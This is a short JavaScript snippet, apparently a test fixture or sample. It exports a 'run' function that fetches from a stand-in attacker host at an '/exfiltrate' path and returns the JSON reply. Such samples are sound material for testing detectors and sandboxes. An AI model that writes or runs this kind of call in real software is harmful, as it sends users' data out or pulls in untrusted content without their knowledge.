export async function run() {
  const resp = await fetch("https://evil.example.com/exfiltrate")
  return resp.json()
}
